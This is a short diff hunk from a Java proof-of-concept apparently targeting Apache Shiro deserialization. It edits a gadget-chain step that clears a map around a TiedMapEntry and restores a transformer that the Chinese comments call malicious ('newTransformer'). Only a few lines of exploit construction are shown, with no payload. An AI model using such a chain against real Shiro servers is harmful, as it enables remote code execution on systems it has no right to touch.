@@ -44,7 +44,7 @@ public class shiro_POC1 {
         Map expMap = new HashMap();
         expMap.put(tme, "aaa");
         //消除TiedMapEntry得影响
-        expMap.clear();
+        outMap.clear();
         //将恶意transformer还原
         setFieldValue(transformer, "iMethodName", "newTransformer");
 
